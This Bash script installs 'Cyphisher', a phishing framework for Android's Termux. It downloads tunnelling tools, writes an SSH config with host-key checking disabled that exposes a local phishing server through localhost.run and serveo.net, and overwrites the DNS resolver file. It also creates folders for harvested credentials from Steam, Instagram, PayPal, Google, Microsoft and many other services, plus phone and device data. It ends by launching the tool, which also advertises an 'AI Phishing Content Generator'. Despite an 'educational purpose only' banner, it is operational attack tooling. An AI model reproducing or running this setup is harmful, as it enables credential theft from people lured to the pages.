#!/usr/bin/env bash
set -euo pipefail

# ===============================
# Cyphisher Setup Script - Termux
# ===============================

AUTO_NGROK="${AUTO_NGROK:-1}"
PORT="${PORT:-5001}"

APP_FILE="main.py"
VENV_DIR="venv"
NGROK_DIR="ngrok"

log(){ printf "\n[setup] %s\n" "$*"; }
error(){ printf "\n[ERROR] %s\n" "$*" >&2; }

# تشخیص پلتفرم
detect_platform() {
    OS="$(uname -s | tr '[:upper:]' '[:lower:]')"
    ARCH="$(uname -m | tr '[:upper:]' '[:lower:]')"

    IS_TERMUX=0
    if [ -n "${PREFIX-}" ] && echo "${PREFIX}" | grep -q "com.termux"; then
        IS_TERMUX=1
        OS="linux"
        if [ "$ARCH" = "aarch64" ]; then
            ARCH="arm64"
        elif [ "$ARCH" = "armv7l" ] || [ "$ARCH" = "arm" ]; then
            ARCH="arm"
        else
            ARCH="arm64"
        fi
    fi

    log "🔧 Platform: OS=$OS ARCH=$ARCH TERMUX=$IS_TERMUX"
}

# رفع مشکلات سیستم
fix_system_issues() {
    log "🔧 Fixing system issues..."
    
    if [ "$IS_TERMUX" -eq 1 ]; then
        pkg install -y ca-certificates openssl-tool -y
        update-ca-certificates --fresh 2>/dev/null || true
    fi
    
    # تنظیم DNS
    if [ -w "$PREFIX/etc/resolv.conf" ]; then
        echo "nameserver 8.8.8.8" > $PREFIX/etc/resolv.conf
        echo "nameserver 1.1.1.1" >> $PREFIX/etc/resolv.conf
        log "✅ DNS servers configured"
    fi
    
    log "✅ System issues fixed"
}

# پاکسازی
cleanup_old_ngrok() {
    log "🧹 Cleaning up previous installations..."
    
    pkill -f ngrok 2>/dev/null || true
    pkill -f cloudflared 2>/dev/null || true
    sleep 2
    
    rm -rf "$NGROK_DIR" 2>/dev/null || true
    rm -rf "cloud_flare" 2>/dev/null || true
    rm -f "ngrok" "ngrok.zip" "ngrok.tar.gz" 2>/dev/null || true
    
    log "✅ Cleanup completed"
}

# نصب dependencies
install_dependencies() {
    log "📦 Installing dependencies..."
    
    if [ "$IS_TERMUX" -eq 1 ]; then
        pkg update -y
        pkg install -y python git curl wget unzip openssl-tool openssh -y
    fi
    
    log "✅ Dependencies installed"
}

# ایجاد محیط پایتون
setup_python_env() {
    log "🐍 Setting up Python environment..."
    
    if [ ! -d "$VENV_DIR" ]; then
        python -m venv "$VENV_DIR"
        log "✅ Virtual environment created"
    fi
    
    source "${VENV_DIR}/bin/activate"
    
    pip install --upgrade pip setuptools wheel
    
    # نصب پکیج‌های ضروری
    pip install requests rich pyfiglet flask flask-cors
    
    # ایجاد requirements.txt
    cat > requirements.txt << 'EOF'
requests==2.31.0
rich==13.5.2
pyfiglet==0.8.post1
flask==2.3.3
flask-cors==4.0.0
EOF
    
    pip install -r requirements.txt
    log "✅ Python packages installed"
}

# نصب ngrok
install_ngrok() {
    log "🌐 Installing ngrok..."
    
    mkdir -p "$NGROK_DIR"
    
    # دانلود ngrok
    URL="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz"
    OUTPUT_FILE="${NGROK_DIR}/ngrok.tar.gz"
    
    if command -v curl >/dev/null 2>&1; then
        curl -L --progress-bar -o "$OUTPUT_FILE" "$URL" || return 1
    elif command -v wget >/dev/null 2>&1; then
        wget -O "$OUTPUT_FILE" "$URL" || return 1
    else
        return 1
    fi
    
    # Extract
    cd "$NGROK_DIR"
    tar -xzf "ngrok.tar.gz"
    cd ..
    
    # تنظیم دسترسی
    chmod 755 "${NGROK_DIR}/ngrok"
    
    # تست ngrok
    if "${NGROK_DIR}/ngrok" --version >/dev/null 2>&1; then
        log "✅ ngrok installed successfully"
        return 0
    else
        error "❌ ngrok test failed"
        return 1
    fi
}

# نصب cloudflared
install_cloudflared() {
    log "🌐 Installing cloudflared as fallback..."
    
    mkdir -p "cloud_flare"
    
    URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
    OUTPUT_FILE="cloud_flare/cloudflared"
    
    if command -v curl >/dev/null 2>&1; then
        curl -L --progress-bar -o "$OUTPUT_FILE" "$URL" || return 1
    elif command -v wget >/dev/null 2>&1; then
        wget -O "$OUTPUT_FILE" "$URL" || return 1
    else
        return 1
    fi
    
    chmod 755 "$OUTPUT_FILE"
    log "✅ cloudflared installed"
    return 0
}

# ایجاد دایرکتوری‌ها
create_directories() {
    log "📁 Creating directories..."
    
    dirs=(
        "steam_Credentials" "insta_Credentials" "location_information" "uploads"
        "IG_FOLLOWER" "Facebook" "Github" "Google" "WordPress" "Django" "Netflix"
        "Discord" "Paypal" "Twitter" "Yahoo" "yandex" "snapchat" "Roblox"
        "adobe" "LinkedIN" "Gitlab" "Ebay" "Dropbox" "chatgpt" "Deepseek"
        "collected_data" "phone_data" "Twitch" "Microsoft"
        "Pages" "ABOUT" "AI"
    )
    
    for dir in "${dirs[@]}"; do
        mkdir -p "$dir"
    done
    
    # ایجاد فایل‌های ضروری
    touch "collected_data/all_devices.json"
    touch "phone_data/numbers.txt"
    
    # ایجاد فایل‌های اولیه برای Pages
    create_default_pages
    
    log "✅ Directories created"
}

# ایجاد صفحات پیش‌فرض
create_default_pages() {
    log "📄 Creating default page files..."
    
    # ایجاد __init__.py برای Pages
    cat > Pages/__init__.py << 'EOF'
# Pages package
EOF

    # ایجاد یک صفحه نمونه
    cat > Pages/sample.py << 'EOF'
from flask import Flask, render_template, request
import os

app = Flask(__name__)

@app.route('/')
def index():
    return '''
    <html>
    <head><title>Sample Page</title></head>
    <body>
        <h1>Welcome to Cyphisher</h1>
        <p>This is a sample phishing page</p>
    </body>
    </html>
    '''

def run():
    app.run(host='0.0.0.0', port=5001, debug=False)
EOF

    # ایجاد صفحه درباره ما
    mkdir -p ABOUT
    cat > ABOUT/About.py << 'EOF'
from rich.console import Console
from rich.panel import Panel

console = Console()

def run():
    console.print(Panel.fit(
        "[bold cyan]Cyphisher - Advanced Phishing Framework[/bold cyan]\n\n"
        "[bold yellow]Features:[/bold yellow]\n"
        "• 29+ Phishing Templates\n"
        "• Multiple Tunnel Services\n"
        "• Educational Purpose Only\n\n"
        "[bold red]Warning:[/bold red] For authorized testing only!",
        title="About Cyphisher",
        border_style="green"
    ))
EOF

    # ایجاد صفحه AI
    mkdir -p AI
    cat > AI/Test.py << 'EOF'
from rich.console import Console
from rich.panel import Panel

console = Console()

def main_interactive():
    console.print(Panel.fit(
        "[bold magenta]AI Phishing Content Generator[/bold magenta]\n\n"
        "This feature generates phishing content using AI.\n"
        "Currently in development...",
        title="AI Content Generator",
        border_style="magenta"
    ))
EOF

    log "✅ Default pages created"
}

# تنظیم SSH برای localhost.run
setup_ssh() {
    log "🔑 Setting up SSH for localhost.run..."
    
    # ایجاد کلید SSH اگر وجود ندارد
    if [ ! -f ~/.ssh/id_rsa ]; then
        mkdir -p ~/.ssh
        ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N "" -q
        log "✅ SSH key generated"
    fi
    
    # تنظیم config برای localhost.run
    cat > ~/.ssh/config << 'EOF'
Host localhost.run
    HostName localhost.run
    RemoteForward 80 localhost:5001
    ServerAliveInterval 60
    ServerAliveCountMax 10
    ExitOnForwardFailure yes
    StrictHostKeyChecking no

Host serveo.net
    HostName serveo.net
    RemoteForward 80 localhost:5001
    ServerAliveInterval 60
    ServerAliveCountMax 10
    ExitOnForwardFailure yes
    StrictHostKeyChecking no
EOF

    chmod 600 ~/.ssh/config
    log "✅ SSH configured for localhost.run and serveo.net"
}

# تست اتصال اینترنت
test_internet() {
    log "🌐 Testing internet connection..."
    
    if ping -c 1 -W 3 8.8.8.8 >/dev/null 2>&1; then
        log "✅ Internet connection: OK"
        return 0
    else
        log "⚠️ Internet connection: Slow or unavailable"
        return 1
    fi
}

# نمایش اطلاعات نصب
show_installation_info() {
    log "==========================================="
    log "🎊 SETUP COMPLETED SUCCESSFULLY!"
    log "==========================================="
    log "Platform: Termux ($ARCH)"
    log "Python: $(python --version 2>/dev/null || echo 'Unknown')"
    log "Virtual Environment: $VENV_DIR"
    log "Port: $PORT"
    log "Primary Tunnel: localhost.run (Free)"
    log "Secondary Tunnel: serveo.net (Free)" 
    log "Fallback Tunnel: Ngrok (Optional)"
    log "SSH: Configured for localhost.run"
    log ""
    log "🚀 Features:"
    log "   • 29+ Phishing Templates"
    log "   • Auto Tunnel Selection"
    log "   • No External Dependencies Required"
    log "   • Works Offline After Setup"
    log ""
    log "📝 Usage:"
    log "   The script will automatically use:"
    log "   1. localhost.run (Primary)"
    log "   2. serveo.net (Secondary)" 
    log "   3. Ngrok (If installed and available)"
    log ""
    log "⚠️  Note: First run may take 20-30 seconds"
    log "    as tunnels establish connection."
    log "==========================================="
}

# تابع اصلی
main() {
    log "🚀 Starting Cyphisher Setup for Termux..."
    
    detect_platform
    
    if [ "$IS_TERMUX" -ne 1 ]; then
        error "This script is for Termux only"
        exit 1
    fi
    
    # تست اینترنت
    if ! test_internet; then
        log "⚠️  No internet connection detected"
        log "📡 Some features may not work without internet"
        sleep 2
    fi
    
    fix_system_issues
    cleanup_old_ngrok
    install_dependencies
    setup_python_env
    
    # تنظیم SSH (ضروری برای localhost.run)
    setup_ssh
    
    # نصب tunnel services (اختیاری)
    if [ "$AUTO_NGROK" = "1" ]; then
        if install_ngrok; then
            log "✅ Ngrok installed as fallback"
        else
            log "⚠️ Ngrok installation skipped (optional)"
        fi
    fi
    
    # نصب cloudflared (اختیاری)
    if install_cloudflared; then
        log "✅ Cloudflared installed as fallback"
    else
        log "⚠️ Cloudflared installation skipped (optional)"
    fi
    
    create_directories
    
    # نمایش اطلاعات نصب
    show_installation_info
    
    log "🚀 Starting application in 5 seconds..."
    sleep 5
    
    if [ -f "${VENV_DIR}/bin/python" ]; then
        clear
        log "🏁 Launching Cyphisher..."
        
        # تنظیم متغیرهای محیطی
        export PATH="$(pwd)/${NGROK_DIR}:$(pwd)/cloud_flare:$PATH"
        export PYTHONPATH="$(pwd)"
        export CYPHISHER_AUTO_TUNNEL="true"
        
        # اجرای برنامه
        exec "${VENV_DIR}/bin/python" "$APP_FILE"
    else
        error "Python binary not found"
        exit 1
    fi
}

# هندل کردن سیگنال‌ها
trap 'error "Setup interrupted"; exit 1' INT TERM

# اجرای اسکریپت
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
